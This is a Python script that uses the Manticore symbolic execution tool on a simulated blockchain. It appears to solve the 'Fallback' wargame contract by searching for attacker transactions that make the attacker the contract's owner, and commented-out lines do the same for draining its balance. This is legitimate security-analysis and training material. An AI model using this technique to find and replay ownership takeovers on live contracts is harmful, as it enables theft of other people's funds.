from manticore.ethereum import ManticoreEVM
from manticore.core.smtlib import Operators, solver
from manticore.ethereum.abi import ABI

ETHER = 10**18

m = ManticoreEVM() # initiate the blockchain

# Generate the accounts
user_account = m.create_account(balance=1000*ETHER)
attacker_account = m.create_account(balance=1000*ETHER)

with open('Fallback.sol') as f:
    contract_account = m.solidity_create_contract(f, owner=user_account)

# 1. Contribute
val_0 = m.make_symbolic_value()
contract_account.contribute(caller=attacker_account, value=val_0)

# 2. Fallback
val_1 = m.make_symbolic_value()
data_1 = m.make_symbolic_buffer(320)
m.transaction(caller=attacker_account, address=contract_account, value=val_1, data=data_1)

# 3. Get Owner
contract_account.owner()

# 3. Withdraw (alternatively)
# contract_account.withdraw(caller=attacker_account)

for state in m.ready_states:
    get_contract_owner_tx = state.platform.transactions[-1]
    # get_withdraw_tx       = state.platform.transactions[-1]

    contract_owner        = state.solve_one(ABI.deserialize("address", get_contract_owner_tx.return_data))
    # contract_balance      = state.solve_one(ABI.deserialize("uint", get_withdraw_tx.return_data))

    attacker_is_owner      = contract_owner==attacker_account
    # contract_balance_empty = contract_balance==0

    is_bug = contract_owner==attacker_account
    # is_bug = contract_balance==0

    if m.generate_testcase(state, name="BUG", only_if=is_bug):
        print(f'Bug found & saved in: {m.workspace}')
        print(f'\nTo print type $: cat {m.workspace}/BUG*.tx')
        m.finalize()
        quit()